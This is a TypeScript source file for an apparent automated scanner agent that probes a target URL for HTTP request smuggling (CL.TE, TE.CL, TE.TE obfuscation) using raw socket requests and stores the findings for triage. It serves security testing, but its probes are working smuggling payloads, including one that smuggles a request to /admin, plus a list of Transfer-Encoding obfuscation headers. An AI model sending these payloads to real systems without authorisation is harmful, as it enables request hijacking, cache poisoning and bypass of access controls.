/**
 * HTTP Request Smuggling Agent
 * Purpose: Detect HTTP request smuggling vulnerabilities
 * 
 * Attack Types:
 * - CL.TE (Content-Length vs Transfer-Encoding)
 * - TE.CL (Transfer-Encoding vs Content-Length)
 * - TE.TE (Transfer-Encoding obfuscation)
 * - HTTP/2 downgrade smuggling
 * - Cache poisoning via smuggling
 */

import { Job } from 'bullmq';
import { BaseAgent } from './base';
import { BaseJob } from '../../../shared/types';
import database from '../services/database';
import logger from '../utils/logger';
import { v4 as uuidv4 } from 'uuid';
import https from 'https';
import http from 'http';
import net from 'net';
import tls from 'tls';

interface RequestSmugglingJob extends BaseJob {
  type: 'request-smuggling';
  options: {
    targetUrl: string;
    programId: string;
    testAllVariants?: boolean;
    timeout?: number;
  };
}

interface SmugglingFinding {
  vulnerability: string;
  variant: 'CL.TE' | 'TE.CL' | 'TE.TE' | 'H2.CL' | 'H2.TE';
  severity: 'critical' | 'high' | 'medium';
  endpoint: string;
  payload: string;
  description: string;
  impact: string;
  evidence?: string;
}

export class RequestSmugglingAgent extends BaseAgent<RequestSmugglingJob> {
  constructor() {
    super('request-smuggling');
  }

  protected getSteps() {
    return [
      { name: 'Analyze target infrastructure' },
      { name: 'Test CL.TE smuggling' },
      { name: 'Test TE.CL smuggling' },
      { name: 'Test TE.TE obfuscation' },
      { name: 'Test HTTP/2 smuggling' },
      { name: 'Store findings' },
    ];
  }

  async process(job: Job<RequestSmugglingJob>): Promise<any> {
    const { programId, options } = job.data;
    const { targetUrl, testAllVariants = true, timeout = 10000 } = options;

    await this.heartbeat();
    await this.updateJobStatus(job.id!, 'active');

    const findings: SmugglingFinding[] = [];

    try {
      const urlObj = new URL(targetUrl);
      const host = urlObj.hostname;
      const port = urlObj.port ? parseInt(urlObj.port) : (urlObj.protocol === 'https:' ? 443 : 80);
      const isHttps = urlObj.protocol === 'https:';
      const path = urlObj.pathname || '/';

      // Step 1: Analyze infrastructure
      await this.updateJobProgress(job.id!, {
        current: 1,
        total: 6,
        percentage: 10,
        currentTool: 'infrastructure-analysis',
        toolStatus: 'running',
        message: 'Analyzing target infrastructure',
      });

      const serverInfo = await this.analyzeInfrastructure(host, port, isHttps, path);
      logger.info({ serverInfo }, 'Infrastructure analysis complete');

      // Step 2: Test CL.TE
      await this.updateJobProgress(job.id!, {
        current: 2,
        total: 6,
        percentage: 25,
        currentTool: 'cl-te-test',
        toolStatus: 'running',
        message: 'Testing CL.TE smuggling',
      });

      const clteFindings = await this.testCLTE(host, port, isHttps, path, timeout);
      findings.push(...clteFindings);

      // Step 3: Test TE.CL
      await this.updateJobProgress(job.id!, {
        current: 3,
        total: 6,
        percentage: 45,
        currentTool: 'te-cl-test',
        toolStatus: 'running',
        message: 'Testing TE.CL smuggling',
      });

      const teclFindings = await this.testTECL(host, port, isHttps, path, timeout);
      findings.push(...teclFindings);

      // Step 4: Test TE.TE obfuscation
      await this.updateJobProgress(job.id!, {
        current: 4,
        total: 6,
        percentage: 65,
        currentTool: 'te-te-test',
        toolStatus: 'running',
        message: 'Testing TE.TE obfuscation',
      });

      const teteFindings = await this.testTETE(host, port, isHttps, path, timeout);
      findings.push(...teteFindings);

      // Step 5: Test HTTP/2 smuggling (if applicable)
      await this.updateJobProgress(job.id!, {
        current: 5,
        total: 6,
        percentage: 80,
        currentTool: 'h2-test',
        toolStatus: 'running',
        message: 'Testing HTTP/2 smuggling',
      });

      // HTTP/2 testing would require h2 library, simplified here
      logger.info('HTTP/2 smuggling test skipped (requires h2 support)');

      // Step 6: Store findings
      await this.updateJobProgress(job.id!, {
        current: 6,
        total: 6,
        percentage: 95,
        currentTool: 'storage',
        toolStatus: 'running',
        message: 'Storing findings',
      });

      for (const finding of findings) {
        await this.storeFinding(programId, finding, job.id!);
      }

      // Trigger handoffs for critical findings
      if (findings.length > 0) {
        await this.triggerHandoffs(programId, findings, job.id!);
      }

      await this.updateJobProgress(job.id!, {
        current: 6,
        total: 6,
        percentage: 100,
        currentTool: 'complete',
        toolStatus: 'completed',
        message: `Found ${findings.length} smuggling vulnerabilities`,
      });

      const result = {
        targetUrl,
        serverInfo,
        findingsCount: findings.length,
        criticalCount: findings.filter(f => f.severity === 'critical').length,
        findings,
      };

      await this.updateJobStatus(job.id!, 'completed', result);
      return result;

    } catch (error: any) {
      logger.error({ error, targetUrl }, 'Request smuggling testing failed');
      await this.updateJobStatus(job.id!, 'failed', null, error.message);
      throw error;
    }
  }

  /**
   * Analyze target infrastructure
   */
  private async analyzeInfrastructure(
    host: string,
    port: number,
    isHttps: boolean,
    path: string
  ): Promise<{ server?: string; via?: string; frontEnd?: string }> {
    return new Promise((resolve) => {
      const request = `GET ${path} HTTP/1.1\r\nHost: ${host}\r\nConnection: close\r\n\r\n`;

      const socket = isHttps
        ? tls.connect({ host, port, rejectUnauthorized: false }, () => {
            socket.write(request);
          })
        : net.connect({ host, port }, () => {
            socket.write(request);
          });

      let data = '';
      socket.on('data', (chunk) => {
        data += chunk.toString();
      });

      socket.on('end', () => {
        const serverMatch = data.match(/Server:\s*([^\r\n]+)/i);
        const viaMatch = data.match(/Via:\s*([^\r\n]+)/i);
        const xPoweredByMatch = data.match(/X-Powered-By:\s*([^\r\n]+)/i);

        resolve({
          server: serverMatch?.[1],
          via: viaMatch?.[1],
          frontEnd: xPoweredByMatch?.[1],
        });
      });

      socket.on('error', () => {
        resolve({});
      });

      setTimeout(() => {
        socket.destroy();
        resolve({});
      }, 5000);
    });
  }

  /**
   * Test CL.TE smuggling
   * Front-end uses Content-Length, back-end uses Transfer-Encoding
   */
  private async testCLTE(
    host: string,
    port: number,
    isHttps: boolean,
    path: string,
    timeout: number
  ): Promise<SmugglingFinding[]> {
    const findings: SmugglingFinding[] = [];

    // CL.TE probe: Send a request where CL says body is short, but TE says there's more
    const smuggledRequest = 'G';  // Start of smuggled "GET" request
    const body = `0\r\n\r\n${smuggledRequest}`;
    const contentLength = 4;  // Only count "0\r\n\r\n" part

    const request = [
      `POST ${path} HTTP/1.1`,
      `Host: ${host}`,
      `Content-Type: application/x-www-form-urlencoded`,
      `Content-Length: ${contentLength}`,
      `Transfer-Encoding: chunked`,
      ``,
      body,
    ].join('\r\n');

    try {
      const response = await this.sendRawRequest(host, port, isHttps, request, timeout);

      // If we get a timeout or the response indicates the smuggled request affected something
      if (response.timedOut || response.statusCode === 400) {
        // Send a follow-up request to confirm
        const confirmRequest = [
          `GET ${path} HTTP/1.1`,
          `Host: ${host}`,
          `Connection: close`,
          ``,
          ``,
        ].join('\r\n');

        const confirmResponse = await this.sendRawRequest(host, port, isHttps, confirmRequest, timeout);

        // If the confirm request gets an unexpected response, smuggling may have worked
        if (confirmResponse.statusCode === 405 || confirmResponse.body?.includes('GPOST')) {
          findings.push({
            vulnerability: 'HTTP Request Smuggling (CL.TE)',
            variant: 'CL.TE',
            severity: 'critical',
            endpoint: `${isHttps ? 'https' : 'http'}://${host}:${port}${path}`,
            payload: request,
            description: 'The server is vulnerable to CL.TE request smuggling. The front-end uses Content-Length while the back-end uses Transfer-Encoding.',
            impact: 'Request hijacking, cache poisoning, credential theft, bypass security controls',
            evidence: `Confirm response status: ${confirmResponse.statusCode}`,
          });
        }
      }
    } catch (error) {
      logger.debug({ error }, 'CL.TE test error');
    }

    return findings;
  }

  /**
   * Test TE.CL smuggling
   * Front-end uses Transfer-Encoding, back-end uses Content-Length
   */
  private async testTECL(
    host: string,
    port: number,
    isHttps: boolean,
    path: string,
    timeout: number
  ): Promise<SmugglingFinding[]> {
    const findings: SmugglingFinding[] = [];

    // TE.CL probe: Front-end processes chunked, back-end uses CL
    const smuggledPart = `GET /admin HTTP/1.1\r\nHost: ${host}\r\nContent-Length: 10\r\n\r\nx=`;
    const body = `${smuggledPart.length.toString(16)}\r\n${smuggledPart}\r\n0\r\n\r\n`;

    const request = [
      `POST ${path} HTTP/1.1`,
      `Host: ${host}`,
      `Content-Type: application/x-www-form-urlencoded`,
      `Content-Length: ${body.length + 100}`,  // Larger than actual body
      `Transfer-Encoding: chunked`,
      ``,
      body,
    ].join('\r\n');

    try {
      const response = await this.sendRawRequest(host, port, isHttps, request, timeout);

      // Check for signs of smuggling
      if (response.timedOut) {
        // Timeout might indicate the back-end is waiting for more data (CL > actual)
        findings.push({
          vulnerability: 'HTTP Request Smuggling (TE.CL) - Potential',
          variant: 'TE.CL',
          severity: 'high',
          endpoint: `${isHttps ? 'https' : 'http'}://${host}:${port}${path}`,
          payload: request,
          description: 'The server may be vulnerable to TE.CL request smuggling. The connection timed out which may indicate the back-end is using Content-Length.',
          impact: 'Request hijacking, cache poisoning, credential theft',
          evidence: 'Connection timeout during TE.CL probe',
        });
      }
    } catch (error) {
      logger.debug({ error }, 'TE.CL test error');
    }

    return findings;
  }

  /**
   * Test TE.TE obfuscation
   * Both use Transfer-Encoding but one can be tricked with obfuscation
   */
  private async testTETE(
    host: string,
    port: number,
    isHttps: boolean,
    path: string,
    timeout: number
  ): Promise<SmugglingFinding[]> {
    const findings: SmugglingFinding[] = [];

    // Various TE obfuscation techniques
    const obfuscations = [
      'Transfer-Encoding: xchunked',
      'Transfer-Encoding : chunked',
      'Transfer-Encoding: chunked\r\nTransfer-Encoding: x',
      'Transfer-Encoding:\tchunked',
      'Transfer-Encoding: chunked\r\n',
      'X: X\r\nTransfer-Encoding: chunked',
      'Transfer-Encoding\r\n: chunked',
    ];

    for (const teHeader of obfuscations) {
      const body = '0\r\n\r\n';
      const request = [
        `POST ${path} HTTP/1.1`,
        `Host: ${host}`,
        `Content-Type: application/x-www-form-urlencoded`,
        `Content-Length: ${body.length}`,
        teHeader,
        ``,
        body,
      ].join('\r\n');

      try {
        const response = await this.sendRawRequest(host, port, isHttps, request, timeout);

        // If the server processes the request differently, it might be vulnerable
        if (response.statusCode === 200 || response.statusCode === 400) {
          // Need differential analysis - compare with normal request
          const normalRequest = [
            `POST ${path} HTTP/1.1`,
            `Host: ${host}`,
            `Content-Type: application/x-www-form-urlencoded`,
            `Content-Length: ${body.length}`,
            `Transfer-Encoding: chunked`,
            ``,
            body,
          ].join('\r\n');

          const normalResponse = await this.sendRawRequest(host, port, isHttps, normalRequest, timeout);

          // If responses differ, there might be a parsing discrepancy
          if (response.statusCode !== normalResponse.statusCode) {
            findings.push({
              vulnerability: 'HTTP Request Smuggling (TE.TE Obfuscation)',
              variant: 'TE.TE',
              severity: 'high',
              endpoint: `${isHttps ? 'https' : 'http'}://${host}:${port}${path}`,
              payload: request,
              description: `The server shows different behavior with obfuscated Transfer-Encoding header: "${teHeader}"`,
              impact: 'Request smuggling via TE header obfuscation',
              evidence: `Normal: ${normalResponse.statusCode}, Obfuscated: ${response.statusCode}`,
            });
            break; // One finding is enough
          }
        }
      } catch (error) {
        logger.debug({ error, teHeader }, 'TE.TE test error');
      }
    }

    return findings;
  }

  /**
   * Send raw HTTP request
   */
  private sendRawRequest(
    host: string,
    port: number,
    isHttps: boolean,
    request: string,
    timeout: number
  ): Promise<{ statusCode?: number; body?: string; timedOut: boolean }> {
    return new Promise((resolve) => {
      let timedOut = false;
      let data = '';

      const socket = isHttps
        ? tls.connect({ host, port, rejectUnauthorized: false }, () => {
            socket.write(request);
          })
        : net.connect({ host, port }, () => {
            socket.write(request);
          });

      socket.on('data', (chunk) => {
        data += chunk.toString();
      });

      socket.on('end', () => {
        const statusMatch = data.match(/HTTP\/[\d.]+ (\d+)/);
        resolve({
          statusCode: statusMatch ? parseInt(statusMatch[1]) : undefined,
          body: data,
          timedOut,
        });
      });

      socket.on('error', (error) => {
        resolve({ timedOut: false });
      });

      const timeoutId = setTimeout(() => {
        timedOut = true;
        socket.destroy();
        resolve({ timedOut: true });
      }, timeout);

      socket.on('close', () => {
        clearTimeout(timeoutId);
      });
    });
  }

  /**
   * Store finding in database
   */
  private async storeFinding(programId: string, finding: SmugglingFinding, jobId: string): Promise<void> {
    try {
      await database.query(
        `INSERT INTO findings (id, program_id, job_id, type, severity, title, url, description, evidence, status, created_at)
         VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, 'new', CURRENT_TIMESTAMP)
         ON CONFLICT (id) DO NOTHING`,
        [
          uuidv4(),
          programId,
          jobId,
          'request-smuggling',
          finding.severity,
          finding.vulnerability,
          finding.endpoint,
          `${finding.description}\n\nImpact: ${finding.impact}`,
          JSON.stringify({ variant: finding.variant, payload: finding.payload, evidence: finding.evidence }),
        ]
      );
    } catch (error) {
      logger.error({ error, finding }, 'Failed to save smuggling finding');
    }
  }

  /**
   * Trigger handoffs for critical findings
   */
  private async triggerHandoffs(programId: string, findings: SmugglingFinding[], jobId: string): Promise<void> {
    await this.handoff('triage', {
      toAgent: 'triage',
      reason: `Found ${findings.length} HTTP request smuggling vulnerabilities requiring immediate triage`,
      data: {
        findings,
        urgency: 'critical',
      },
      priority: 10,
      metadata: {
        programId,
        parentJobId: jobId,
        source: 'request-smuggling',
      },
    });
  }
}

export default new RequestSmugglingAgent();
